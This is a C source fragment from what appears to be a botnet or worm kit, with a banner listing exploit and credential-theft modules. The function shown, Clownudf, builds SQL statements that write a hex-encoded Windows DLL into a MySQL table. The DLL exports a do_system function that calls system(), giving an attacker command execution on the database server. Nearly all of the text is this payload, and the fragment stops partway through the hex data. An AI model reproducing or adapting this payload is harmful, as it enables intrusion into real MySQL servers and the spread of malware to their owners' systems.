/* |  _ \ \ \/ /    / |___ \ / _ \ TesT |  \/  |/ _ \|  _ \    \ \   / /___ \ 
   | |_) | \  /_____| | __) | | | |_____| |\/| | | | | | | |____\ \ / /  __) |
   |  _ <  /  \_____| |/ __/| |_| |_____| |  | | |_| | |_| |_____\ V /  / __/ 
   |_| \_\/_/\_\ BuZ|_|_____|\___/      |_|  |_|\___/|____/  BuZ  \_/  |_____|
   ---------------------------------------------------------------------------
   --MSSQL-NTPASS-SYM06010-MS04007-MS06040-VNCBRUTE-PSTORE-FIREFOX-SP2PATCH---  
   ---------------------------------------------------------------------------
               Greets To: THE REAL CODERS & The Ryan1918 Crew !!
 */

#include "..\Inc.h"
#include "..\Fun.h"
#include "..\Ext.h"

#include "..\mysql headers\mysql.h"
#pragma comment(lib, "mysqlclient")
#pragma comment(lib, "Advapi32")

#ifndef ulong
#define ulong unsigned long
#endif

#ifndef uint
#define uint unsigned int
#endif

#ifndef uchar
#define uchar unsigned char
#endif 

BOOL Clownudf(EXINFO exinfo)
{

char rem_table[] = "DROP TABLE IF EXISTS clown;";
char create_table[] = "CREATE TABLE clown (line BLOB);";
char do_system[] = 
"INSERT INTO clown (line) VALUES(0x"
"4D5A90000300000004000000FFFF0000B8000000000000004000000000000000"
"0000000000000000000000000000000000000000000000000000000080000000"
"0E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F"
"742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000"
"504500004C0108009804B3410022000030010000E00006200B01023800080000"
"0010000000020000001000000010000000200000000084680010000000020000"
"0400000001000000040000000000000000900000000400003225010003000000"
"0000200000100000000010000010000000000000100000000040000049000000"
"0050000068010000000000000000000000000000000000000000000000000000"
"0060000094000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000002E74657874000000"
"9406000000100000000800000004000000000000000000000000000060000060"
"2E64617461000000300000000020000000020000000C00000000000000000000"
"00000000400000C02E6273730000000090000000003000000000000000000000"
"000000000000000000000000800000C02E656461746100004900000000400000"
"00020000000E0000000000000000000000000000000000C02E69646174610000"
"68010000005000000002000000100000000000000000000000000000400000C0"
"2E72656C6F630000940000000060000000020000001200000000000000000000"
"00000000000000C02E7374616200000048030000007000000004000000140000"
"000000000000000000000000020800422E73746162737472A108000000800000"
"000A000000180000000000000000000000000000020800420000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"5589E583EC188975FC8B750C895DF883FE01744F897424048B4510894424088B"
"4508890424E87601000083EC0C83FE0189C3742485F6750BA10030846885C075"
"1031DB89D88B5DF88B75FC89EC5DC20C00E84A000000EBEB85C075D8E83F0000"
"00EBD1C7042480000000E8A1050000A30030846885C07417C70000000000A310"
"308468E818020000E8B3010000EB85E86C050000C7000C00000031C0EBA789F6"
"5589E583EC08895DFC8B150030846885D2742A8B1D1030846883EB0439D3720D"
"8B0385C0752A83EB0439D373F3891424E81B05000031D2891500308468C70424"
"00000000E8F70400008B5DFC89EC5DC3FFD08B1500308468EBCC8DB600000000"
"5589E583EC18C7442408103084688B4508C744240400308468890424E8AF0400"
"0085C00F95C089EC5D0FB6C048C389F65589E583EC18C7442408103084688B45"
"08C744240400308468890424E87F04000089EC5DC39090909090909090909090"
"5589E55DE927020000909090909090905589E583EC088B450C8338017402EB13"
"83EC0C8B450C8B4008FF30E89004000083C410B800000000C9C3909090909090"
"5589E5B8010000005DC20C00909090905589E583EC08A1002084688B0885C975"
"0489EC5DC3FF108B15002084688D42048B5204A30020846885D275E9EBE389F6"
"5589E583EC08895DFCA18016846883F8FF742985C089C37517C70424B0118468"
"E8FBFEFFFF8B5DFC89EC5DC38D742600FF149D801684684B75F6EBDD8B158416"
"846831C085D274CBBA801684688D7600408B5C820485DB75F7EBB8908D742600"
"55A10420846889E585C074045DC389F65DB901000000890D04208468EB829090"
"5589E5568B4D08538B5D0C8B751039D973208DB426000000008DBC2700000000"
"8B410489F201C28B0183C108010239D972EE5B5E5DC38D76008DBC2700000000"
"5589E583EC18C744240800008468C744240400308468C7042400308468E89EFF"
"FFFF89EC5DC3909090909090909090902D4C49424743435733322D45482D534A"
"4C4A2D475448522D4D494E47573332005589E55050A150308468FF500489EC5D"
"C3EB0D909090909090909090909090905531C089E5B90E000000FC578B7D08F3"
"AB8B45088B55088B4D08C70038000000C7400430168468C74008F0128468A120"
"3084688942148B1524208468A12020846889511C894118A130308468894128C7"
"412CFFFFFFFFA1282084688B152C208468C74124000000008941308951345F5D"
"C3EB0D909090909090909090909090905589E5565383EC408B155030846885D2"
"740E8D65F85B5E5DC38DB42600000000A1D012846883EC0C8945D88D75B8A1D4"
"128468568945DCA1D81284688945E0A1DC1284688945E4A1E01284688945E8A1"
"E41284688945ECA1E81284688945F0A1EC128468C745B841414141C745BC4141"
"4141C745C041414141C745C441414141C745C841414141C745CC41414141C745"
"D041414141C745D4414141418945F4E80C02000083C40C6685C0743483EC0C25"
"FFFF000050E82601000083C41089C38D4304891D50308468A3403084688D4308"
"A360308468E938FFFFFF8DB60000000083EC0C6A38E89601000083C41089C385"
"C0742C83EC0C50E884FEFFFF891C24E82C00000083C4106685C075B383EC0C53"
"E84B010000893424E893010000EB90E87C0100008DB6000000008DBF00000000"
"55B81F00000089E5BA01000000565383EC408B7508B14185F27502B161884C05"
"B801D24879EFA1D012846883EC0C8945D8A1D41284688945DCA1D81284688945"
"E0A1DC1284688945E4A1E01284688945E8A1E41284688945ECA1E81284688945"
"F0A1EC1284688945F48D45B850E81E01000083C40C6685C0750B31D28D65F889"
"D05B5E5DC383EC0C89C381E3FFFF000053E81A00000089DA83C41039F075DBEB"
"DBEB0D909090909090909090909090905589E55383EC4831DB8D45B86A40508B"
"450825FFFF000050E8D3000000BA1F0000005985C0B90100000074208D742600"
"807C15B841741101C94A79F4833B38750B89D88B5DFCC9C309CBEBEBE86F0000"
"00909090909090909090909090909090FF258C50846890900000000000000000"
"FF259850846890900000000000000000FF259C50846890900000000000000000"
"FF259050846890900000000000000000FF25A050846890900000000000000000"
"FF25A450846890900000000000000000FF259450846890900000000000000000"
"FF257C50846890900000000000000000FF257850846890900000000000000000"
"FF2580508468909000000000000000005589E55DE9E7FAFFFF90909090909090"
"FFFFFFFF7016846800000000FFFFFFFF00000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"9016846800000000000000000000000000000000000000000000000000000000"
"00000000FFFFFFFF00000000FFFFFFFF00000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"000000009804B341000000003240000001000000010000000100000028400000"
"2C40000030400000701100003F40000000007368656C6C2E736F2E302E300064"
"6F5F73797374656D000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"4050000000000000000000003051000078500000545000000000000000000000"
"5C5100008C500000000000000000000000000000000000000000000000000000"
"AC500000B8500000C45000000000000000000000D4500000E4500000F0500000"
"F8500000045100000C510000185100000000000000000000AC500000B8500000"
"C45000000000000000000000D4500000E4500000F0500000F850000004510000"
"0C5100001851000000000000000041646441746F6D410000940046696E644174"
"6F6D4100C10047657441746F6D4E616D6541000024005F5F646C6C6F6E657869"
"7400000093005F6572726E6F00000000FE0161626F727400190266666C757368"
"0000000028026672656500005B026D616C6C6F6300000000970273797374656D"
"000000000050000000500000005000004B45524E454C33322E646C6C00000000"
"145000001450000014500000145000001450000014500000145000006D737663"
"72742E646C6C0000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0010000088000000393070307F30AB30B530D930F4300A3115313A314531B731"
"C931D431EA31FC3113321E32293242325832AA32B232B932F63233333A333F33"
"48334D33583367336D339A33B133BF33C833D033D833E033E833F03354345934"
"6134E734F234FA3402350A3512351A352235D235E235F2350236123622363236"
"4236523662368436002000000C00000000300000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0100000000005400A10800000900000064000000701184680100000064000000"
"701184681C0000003C000000000000002B000000800000000000000055000000"
"80000000000000006F00000080000000000000009E0000008000000000000000"
"D600000080000000000000001301000080000000000000006401000080000000"
"00000000B50100008000000000000000E001000080000000000000000F020000"
"8000000000000000390200008000000000000000620200008000000000000000"
"7C0200008000000000000000970200008000000000000000B802000080000000"
"00000000F102000080000000000000000F03000080000000000000002F030000"
"8000000000000000540300008000000000000000750300008000000000000000"
"0100000082000000937F00008C030000820000005E340000AF03000082000000"
"0000000000000000A200000000000000D30300008200000000000000F7030000"
"82000000F60E0000350400008000D70000000000490400008000470100000000"
"5E040000800064010000000000000000A20000000000000000000000A2000000"
"0000000072040000820000000000000096040000820000003C080000D4040000"
"80002C000000000000000000A20000000000000000000000A200000000000000"
"F10400008000000000000000A50500008000A10000000000B705000080002701"
"0000000000000000A200000000000000CB05000082000000D0300000D3030000"
"C200000000000000F7030000820000000000000000000000A200000000000000"
"EF05000080008B01000000002606000080008C01000000005E06000080009F01"
"00000000830600008000E6010000000000000000A200000000000000BD060000"
"80000000000000000B07000080000000000000009F0700008000110000000000"
"B507000080000000000000003508000080001900000000004B08000024001B00"
"701184685C080000A0001A000800000071080000A0001A000C00000085080000"
"A0001A001000000094080000A0001A00140000000000000044001B0000000000"
"0000000044001C00060000000000000044001D000E0000000000000044001E00"
"1000000000000000440020002300000000000000240000002A00000000000000"
"640000009A118468000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"007368656C6C2E6300463A2F6578706C6F6974732F4D7953514C2F0067636332"
"5F636F6D70696C65642E00696E743A7428302C31293D7228302C31293B2D3231"
"34373438333634383B323134373438333634373B00636861723A7428302C3229"
"3D7228302C32293B303B3132373B006C6F6E6720696E743A7428302C33293D72"
"28302C33293B2D323134373438333634383B323134373438333634373B00756E"
"7369676E656420696E743A7428302C34293D7228302C34293B30303030303030"
"3030303030303B303033373737373737373737373B006C6F6E6720756E736967"
"6E656420696E743A7428302C35293D7228302C35293B30303030303030303030"
"3030303B303033373737373737373737373B006C6F6E67206C6F6E6720696E74"
"3A7428302C36293D407336343B7228302C36293B303130303030303030303030"
"30303030303030303030303B3037373737373737373737373737373737373737"
"37373B006C6F6E67206C6F6E6720756E7369676E656420696E743A7428302C37"
"293D407336343B7228302C37293B303030303030303030303030303B30313737"
"373737373737373737373737373737373737373B0073686F727420696E743A74"
"28302C38293D407331363B7228302C38293B2D33323736383B33323736373B00"
"73686F727420756E7369676E656420696E743A7428302C39293D407331363B72"
"28302C39293B303B36353533353B007369676E656420636861723A7428302C31"
"30293D4073383B7228302C3130293B2D3132383B3132373B00756E7369676E65"
"6420636861723A7428302C3131293D4073383B7228302C3131293B303B323535"
"3B00666C6F61743A7428302C3132293D7228302C31293B343B303B00646F7562"
"6C653A7428302C3133293D7228302C31293B383B303B006C6F6E6720646F7562"
"6C653A7428302C3134293D7228302C31293B31323B303B00636F6D706C657820"
"696E743A7428302C3135293D73387265616C3A28302C31292C302C33323B696D"
"61673A28302C31292C33322C33323B3B00636F6D706C657820666C6F61743A74"
"28302C3136293D52333B383B303B00636F6D706C657820646F75626C653A7428"
"302C3137293D52343B31363B303B00636F6D706C6578206C6F6E6720646F7562"
"6C653A7428302C3138293D52353B32343B303B005F5F6275696C74696E5F7661"
"5F6C6973743A7428302C3139293D2A28302C3229005F426F6F6C3A7428302C32"
"30293D4073383B2D31363B00633A2F70726F6772616D6D652F6D696E67772F69"
"6E636C7564652F737464696F2E6800633A2F70726F6772616D6D652F6D696E67"
"772F696E636C7564652F5F6D696E67772E6800633A2F70726F6772616D6D652F"
"6D696E67772F696E636C7564652F7374646465662E6800633A2F70726F677261"
"6D6D652F6D696E67772F6C69622F6763632D6C69622F6D696E677733322F332E"
"322E332F696E636C7564652F7374646465662E680073697A655F743A7428352C"
"31293D28302C34290077636861725F743A7428352C32293D28302C3929007769"
"6E745F743A7428352C33293D28302C392900633A2F70726F6772616D6D652F6D"
"696E67772F696E636C7564652F7374646172672E6800633A2F70726F6772616D"
"6D652F6D696E67772F6C69622F6763632D6C69622F6D696E677733322F332E32"
"2E332F696E636C7564652F7374646172672E68005F5F676E75635F76615F6C69"
"73743A7428372C31293D28302C313929005F696F6275663A5428322C31293D73"
"33325F7074723A28322C32293D2A28302C32292C302C33323B5F636E743A2830"
"2C31292C33322C33323B5F626173653A28322C32292C36342C33323B5F666C61"
"673A28302C31292C39362C33323B5F66696C653A28302C31292C3132382C3332"
"3B5F636861726275663A28302C31292C3136302C33323B5F62756673697A3A28"
"302C31292C3139322C33323B5F746D70666E616D653A28322C32292C3232342C"
"33323B3B0046494C453A7428322C33293D28322C31290066706F735F743A7428"
"322C34293D28302C362900633A2F70726F6772616D6D652F6D696E67772F696E"
"636C7564652F7374646C69622E68006469765F743A7428382C31293D28382C32"
"293D733871756F743A28302C31292C302C33323B72656D3A28302C31292C3332"
"2C33323B3B006C6469765F743A7428382C33293D28382C34293D733871756F74"
"3A28302C33292C302C33323B72656D3A28302C33292C33322C33323B3B005F6F"
"6E657869745F743A7428382C35293D28382C36293D2A28382C37293D6628302C"
"3129006C6C6469765F743A7428382C38293D28382C39293D73313671756F743A"
"28302C36292C302C36343B72656D3A28302C36292C36342C36343B3B00497465"
"6D5F726573756C743A5428312C31293D65535452494E475F524553554C543A30"
"2C5245414C5F524553554C543A312C494E545F524553554C543A322C524F575F"
"524553554C543A332C3B0073745F7564665F617267733A5428312C32293D7332"
"306172675F636F756E743A28302C34292C302C33323B6172675F747970653A28"
"312C33293D2A28312C31292C33322C33323B617267733A28312C34293D2A2832"
"2C32292C36342C33323B6C656E677468733A28312C35293D2A28302C35292C39"
"362C33323B6D617962655F6E756C6C3A28322C32292C3132382C33323B3B0055"
"44465F415247533A7428312C36293D28312C32290073745F7564665F696E6974"
"3A5428312C37293D7332306D617962655F6E756C6C3A28302C32292C302C383B"
"646563696D616C733A28302C34292C33322C33323B6D61785F6C656E6774683A"
"28302C35292C36342C33323B7074723A28322C32292C39362C33323B636F6E73"
"745F6974656D3A28302C32292C3132382C383B3B005544465F494E49543A7428"
"312C38293D28312C372900646F5F73797374656D3A4628302C312900696E6974"
"69643A7028312C39293D2A28312C382900617267733A7028312C3130293D2A28"
"312C36290069735F6E756C6C3A7028322C3229006572726F723A7028322C3229"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000"
"2E66696C650000000F000000FEFF00006701646C6C637274312E630000000000"
"0000000000000000040000000000000001002000020100000000000000000000"
"0000000000000000000000001A00000000000000030000000300000000002800"
"0000100000000300000003000000000035000000A00000000100200003005F61"
"746578697400000100000100200002005F5F6F6E657869743001000001002000"
"02002E7465787400000000000000010000000301550100001400000000000000"
"0000000000002E64617461000000000000000200000003010000000000000000"
"000000000000000000002E627373000000000000000003000000030120000000"
"00000000000000000000000000002E66696C6500000019000000FEFF00006701"
"63727473747566662E6300000000000000000000000041000000600100000100"
"200002010000000000000000000000000000000000002E746578740000006001"
"00000100000003010900000001000000000000000000000000002E6461746100"
"0000000000000200000003010000000000000000000000000000000000002E62"
"7373000000002000000003000000030100000000000000000000000000000000"
"00002E66696C6500000025000000FEFF000067017368656C6C2E630000000000"
"0000000000000000000051000000700100000100200002010000000000000000"
"000000000000000000002E74657874000000700100000100000003012A000000"
"01000000000000000000000000002E6461746100000000000000020000000301"
"0000000000000000000000000000000000002E62737300000000200000000300"
"000003010000000000000000000000000000000000002E737461620000000000"
"00000700000003015403000004000000000000000000000000002E66696C6500"
"00002F000000FEFF00006701646C6C6D61696E2E630000000000000000000000"
"00005C000000A001000001002000020100000000000000000000000000000000"
"00002E74657874000000A00100000100000003010C0000000000000000000000"
"0000000000002E64617461000000000000000200000003010000000000000000"
"000000000000000000002E627373000000002000000003000000030100000000"
"00000000000000000000000000002E66696C650000003D000000FEFF00006701"
"6763636D61696E2E630000000000000000005F702E3000000000000000000200"
"000003000000000068000000B001000001002000020100000000000000000000"
"0000000000000000000000007B000000E0010000010020000200000000008E00"
"0000040000000200000003005F5F5F6D61696E00400200000100200002002E74"
"657874000000B0010000010000000301AE0000000B0000000000000000000000"
"00002E6461746100000000000000020000000301080000000100000000000000"
"0000000000002E62737300000000200000000300000003010000000000000000"
"000000000000000000002E66696C6500000048000000FEFF0000670170736575"
"646F2D72656C6F632E6300000000000000009B00000060020000010020000301"
"00000000000000000000000000000000000000000000AC000000A00200000100"
"200002002E746578740000006002000001000000030166000000030000000000"
"00000000000000002E6461746100000010000000020000000301000000000000"
"0000000000000000000000002E62737300000000200000000300000003010000"
"000000000000000000000000000000002E66696C6500000098000000FEFF0000"
"670100000000C7000000000000000000000000002E74657874000000D0020000"
"0100000003010000000000000000000000000000000000002E64617461000000"
"100000000200000003010200000000000000000000000000000000002E627373"
"0000000020000000030000000301000000000000000000000000000000000000"
"00000000DB000000D002000001000000060000000000EC000000F00200000100"
"2000030100000000000000000000000000000000000000000000100100002000"
"0000030000000300000000002401000020000000020000000300000000003001"
"000030000000030000000300000000003E010000280000000200000003000000"
"00004A0100001003000001002000030000000000660100009003000001002000"
"02000000000082010000C0040000010020000300000000009701000070050000"
"0100200003002E74657874000000D0020000010000000301F102000025000000"
"000000000000000000002E646174610000002000000002000000030110000000"
"00000000000000000000000000002E6273730000000020000000030000000301"
"2000000000000000000000000000000000002E74657874000000D00500000100"
"000003010000000000000000000000000000000000002E646174610000003000"
"00000200000003010000000000000000000000000000000000002E6273730000"
"0000400000000300000003010000000000000000000000000000000000002E74"
"657874000000D00500000100000003002E646174610000003000000002000000"
"03002E62737300000000400000000300000003002E6964617461243740010000"
"0500000003002E696461746124358C0000000500000003002E69646174612434"
"540000000500000003002E69646174612436D40000000500000003002E746578"
"74000000E00500000100000003002E6461746100000030000000020000000300"
"2E62737300000000400000000300000003002E696461746124374C0100000500"
"000003002E69646174612435980000000500000003002E696461746124346000"
"00000500000003002E69646174612436F80000000500000003002E7465787400"
"0000F00500000100000003002E64617461000000300000000200000003002E62"
"737300000000400000000300000003002E696461746124375001000005000000"
"03002E696461746124359C0000000500000003002E6964617461243464000000"
"0500000003002E69646174612436040100000500000003002E74657874000000"
"000600000100000003002E64617461000000300000000200000003002E627373"
"00000000400000000300000003002E6964617461243744010000050000000300"
"2E69646174612435900000000500000003002E69646174612434580000000500"
"000003002E69646174612436E40000000500000003002E746578740000001006"
"00000100000003002E64617461000000300000000200000003002E6273730000"
"0000400000000300000003002E69646174612437540100000500000003002E69"
"646174612435A00000000500000003002E696461746124346800000005000000"
"03002E696461746124360C0100000500000003002E7465787400000020060000"
"0100000003002E64617461000000300000000200000003002E62737300000000"
"400000000300000003002E69646174612437580100000500000003002E696461"
"74612435A40000000500000003002E696461746124346C000000050000000300"
"2E69646174612436180100000500000003002E74657874000000300600000100"
"000003002E64617461000000300000000200000003002E627373000000004000"
"00000300000003002E69646174612437480100000500000003002E6964617461"
"2435940000000500000003002E696461746124345C0000000500000003002E69"
"646174612436F00000000500000003002E66696C65000000A8000000FEFF0000"
"670166616B650000000000000000000000000000686E616D6500000054000000"
"050000000300667468756E6B00008C0000000500000003002E74657874000000"
"400600000100000003010000000000000000000000000000000000002E646174"
"6100000030000000020000000301000000000000000000000000000000000000"
"2E62737300000000400000000300000003010000000000000000000000000000"
"000000002E696461746124321400000005000000030114000000030000000000"
"00000000000000002E6964617461243588000000050000000301040000000000"
"0000000000000000000000002E69646174612434500000000500000003010400"
"000000000000000000000000000000002E66696C65000000CB000000FEFF0000"
"670166616B6500000000000000000000000000002E7465787400000040060000"
"0100000003010000000000000000000000000000000000002E64617461000000"
"300000000200000003010000000000000000000000000000000000002E627373"
"0000000040000000030000000301000000000000000000000000000000000000"
"2E69646174612434700000000500000003010400000000000000000000000000"
"000000002E69646174612435A800000005000000030104000000000000000000"
"00000000000000002E696461746124375C0100000500000003010B0000000000"
"0000000000000000000000002E74657874000000400600000100000003002E64"
"617461000000300000000200000003002E627373000000004000000003000000"
"03002E69646174612437280100000500000003002E696461746124357C000000"
"0500000003002E69646174612434440000000500000003002E69646174612436"
"B80000000500000003002E74657874000000500600000100000003002E646174"
"61000000300000000200000003002E6273730000000040000000030000000300"
"2E69646174612437240100000500000003002E69646174612435780000000500"
"000003002E69646174612434400000000500000003002E69646174612436AC00"
"00000500000003002E74657874000000600600000100000003002E6461746100"
"0000300000000200000003002E62737300000000400000000300000003002E69"
"6461746124372C0100000500000003002E696461746124358000000005000000"
"03002E69646174612434480000000500000003002E69646174612436C4000000"
"0500000003002E66696C65000000DB000000FEFF0000670166616B6500000000"
"00000000000000000000686E616D650000004000000005000000030066746875"
"6E6B0000780000000500000003002E7465787400000070060000010000000301"
"0000000000000000000000000000000000002E64617461000000300000000200"
"000003010000000000000000000000000000000000002E627373000000004000"
"00000300000003010000000000000000000000000000000000002E6964617461"
"2432000000000500000003011400000003000000000000000000000000002E69"
"6461746124357400000005000000030104000000000000000000000000000000"
"00002E696461746124343C000000050000000301040000000000000000000000"
"0000000000002E66696C65000000E9000000FEFF0000670166616B6500000000"
"000000000000000000002E746578740000007006000001000000030100000000"
"00000000000000000000000000002E6461746100000030000000020000000301"
"0000000000000000000000000000000000002E62737300000000400000000300"
"000003010000000000000000000000000000000000002E696461746124344C00"
"00000500000003010400000000000000000000000000000000002E6964617461"
"2435840000000500000003010400000000000000000000000000000000002E69"
"646174612437300100000500000003010D000000000000000000000000000000"
"00002E66696C65000000F5000000FEFF0000670163727473747566662E630000"
"00000000000000000000AC010000700600000100200003010000000000000000"
"000000000000000000002E746578740000007006000001000000030109000000"
"01000000000000000000000000002E6461746100000030000000020000000301"
"0000000000000000000000000000000000002E62737300000000400000000300"
"000003010000000000000000000000000000000000002E63746F727300008406"
"000001000000030104000000010000000000000000000000000000000000BE01"
"00000000000001000000020000000000DD010000000000000200000002000000"
"0000EC0100008C0600000100000002005F66726565000000F005000001002000"
"020000000000FB0100004000000003000000020000000000160200005C010000"
"050000000200000000002A0200007C0000000500000002005F5F6572726E6F00"
"00060000010020000200000000003D0200009400000005000000020000000000"
"4A02000000100000FFFF00000200000000006302000000002000FFFF00000200"
"000000007D02000004000000FFFF000002000000000099020000500600000100"
"0000020000000000A50200000000000003000000020000000000B30200000000"
"000001000000020000000000D602000000100000FFFF0000020000000000EE02"
"0000900000000500000002005F5F646C6C5F5F0000000000FFFF000002000000"
"0000FC02000000000000FFFF0000020000000000110300001400000005000000"
"0200000000002403000000008468FFFF00000200000000003303000000100000"
"FFFF00000200000000004903000000000000010000000200656E640000000000"
"0000000001000000020000000000670300003000000002000000020000000000"
"7403000050000000030000000200000000008503000080060000010000000200"
"5F66666C75736800E00500000100200002006574657874000000940600000100"
"00000200000000009303000090000000030000000200000000009F0300008006"
"000001000000020000000000AE0300008000000005000000020000000000C503"
"00008C00000005000000020000000000D8030000A40000000500000002000000"
"0000E603000000020000FFFF0000020000000000F9030000A000000005000000"
"0200000000000704000004000000FFFF000002005F5F656E645F5F0000000000"
"010000000200000000001C040000D00500000100200002005F6D616C6C6F6300"
"1006000001002000020000000000290400008C06000001000000020000000000"
"3704000000001000FFFF00000200000000005004000003000000FFFF00000200"
"000000005E040000980000000500000002005F61626F72740000300600000100"
"20000200000000006C0400006000000003000000020000000000880400009C00"
"0000050000000200000000009404000001000000FFFF000002005F656E640000"
"00000000000001000000020000000000AC04000000000000FFFF000002000000"
"0000BD0400007800000005000000020000000000CF0400000000000005000000"
"020000000000E404000000000000FFFF00000200000000000005000000000000"
"FFFF000002000000000018050000400600000100000002000000000025050000"
"6006000001000000020000000000360500000000000001000000020000000000"
"58050000300100000500000002005F73797374656D0020060000010020000200"
"6E0500005F446C6C4D61696E43525453746172747570403132005F6669727374"
"5F617465786974005F6E6578745F617465786974005F5F5F646C6C5F65786974"
"005F5F5F646F5F736A6C6A5F696E6974005F646F5F73797374656D005F446C6C"
"4D61696E403132005F5F5F646F5F676C6F62616C5F64746F7273005F5F5F646F"
"5F676C6F62616C5F63746F7273005F696E697469616C697A6564005F646F5F70"
"736575646F5F72656C6F63005F5F7065693338365F72756E74696D655F72656C"
"6F6361746F720070736575646F2D72656C6F632D6C6973742E63005F7733325F"
"61746F6D5F737566666978005F5F5F7733325F7368617265647074725F646566"
"61756C745F756E6578706563746564005F6477325F6F626A6563745F6D757465"
"782E30005F6477325F6F6E63652E31005F736A6C5F66635F6B65792E32005F73"
"6A6C5F6F6E63652E33005F5F5F7733325F65685F7368617265645F696E697469"
"616C697A65005F5F5F7733325F7368617265647074725F696E697469616C697A"
"65005F5F5F7733325F7368617265647074725F736574005F5F5F7733325F7368"
"617265647074725F676574005F5F5F736A6C6A5F696E69745F63746F72005F5F"
"5F52554E54494D455F50534555444F5F52454C4F435F4C4953545F5F005F5F64"
"6174615F73746172745F5F005F5F5F44544F525F4C4953545F5F005F5F5F7733"
"325F7368617265647074725F7465726D696E617465005F5F6C69626D73766372"
"745F615F696E616D65005F5F696D705F5F46696E6441746F6D414034005F5F69"
"6D705F5F61626F7274005F5F73697A655F6F665F737461636B5F636F6D6D6974"
"5F5F005F5F73697A655F6F665F737461636B5F726573657276655F5F005F5F6D"
"616A6F725F73756273797374656D5F76657273696F6E5F5F005F41646441746F"
"6D414034005F5F6273735F73746172745F5F005F5F5F52554E54494D455F5053"
"4555444F5F52454C4F435F4C4953545F454E445F5F005F5F73697A655F6F665F"
"686561705F636F6D6D69745F5F005F5F696D705F5F5F6572726E6F005F5F6D69"
"6E6F725F6F735F76657273696F6E5F5F005F5F686561645F6C69626D73766372"
"745F61005F5F696D6167655F626173655F5F005F5F73656374696F6E5F616C69"
"676E6D656E745F5F005F5F52554E54494D455F50534555444F5F52454C4F435F"
"4C4953545F5F005F5F646174615F656E645F5F005F5F5F7733325F7368617265"
"64707472005F5F43544F525F4C4953545F5F005F5F6273735F656E645F5F005F"
"5F5F43544F525F4C4953545F5F005F5F696D705F5F47657441746F6D4E616D65"
"41403132005F5F696D705F5F5F5F646C6C6F6E65786974005F5F696D705F5F73"
"797374656D005F5F66696C655F616C69676E6D656E745F5F005F5F696D705F5F"
"6D616C6C6F63005F5F6D616A6F725F6F735F76657273696F6E5F5F005F5F5F64"
"6C6C6F6E65786974005F5F44544F525F4C4953545F5F005F5F73697A655F6F66"
"5F686561705F726573657276655F5F005F5F73756273797374656D5F5F005F5F"
